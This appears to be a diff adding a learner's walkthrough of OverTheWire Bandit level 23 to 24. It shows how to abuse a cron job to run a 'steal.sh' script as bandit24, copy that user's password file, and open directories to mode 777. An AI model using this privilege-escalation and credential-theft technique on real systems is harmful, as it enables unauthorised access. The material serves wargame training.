@@ -1,0 +1,22 @@
+Level Difficulty: High
+Commands Used: cat,chmod,cp,mktemp,sleep,ls,stat
+              cat -> reads and prints file content, also used with > to write our own script
+              chmod -> changes file permissions, +x makes a file executable, applied to a directory it controls who can enter/write there
+              cp -> copies a file, used instead of mv since our script gets deleted after cron runs it
+              mktemp -> creates a temp file, -d makes it a directory, safer than a guessable name
+              sleep -> pauses for N seconds, used to wait out a cron cycle
+              ls -> -ld on a directory shows the directory's OWN permissions, not the files inside it
+              stat -> shows file metadata, --format "%U" specifically shows the owner
+Steps: cat /usr/bin/cronjob_bandit24.sh [read the script that runs every minute as bandit24 - it cd's into /var/spool/bandit24/foo, loops over every file there, and executes any file OWNED by bandit23 before deleting it. this ownership check is backwards as security since we can just create files that are automatically owned by us]
+       mktemp -d && cd /tmp/tmp.xxxxxxxxxx [fresh owned working directory, unguessable name so OTWs tmp cleanup cant sweep it mid-attempt]
+       cat > steal.sh
+         #!/bin/bash
+         cat /etc/bandit_pass/bandit24 > /tmp/tmp.xxxxxxxxxx/bandit24_password.txt
+         chmod 777 /tmp/tmp.xxxxxxxxxx/bandit24_password.txt
+       [script reads bandit24's password and writes it into our own folder - only works because when cron eventually runs it, it executes AS bandit24]
+       chmod +x steal.sh [needs to be executable, the cron script runs files directly not just reads them]
+       ls -ld [checked our own working directory's permissions and found mktemp -d defaults to drwx------ (700) - owner only, nobody else can even enter it]
+       chmod 777 /tmp/tmp.xxxxxxxxxx [THE key fix - bandit24's process needs to be able to enter and write into OUR folder for the password file to land there, mktemp's default lockdown was silently blocking that the whole time. no error ever showed because the cron job redirects everything to /dev/null]
+       cp steal.sh /var/spool/bandit24/foo/ [drop the script into the folder bandit24's cron job watches]
+       WAIT 60 SECONDS
+       cat /tmp/tmp.xxxxxxxxxx/bandit24_password.txt [password shows up here - bandit24's own cron job just ran our code and wrote it for us]
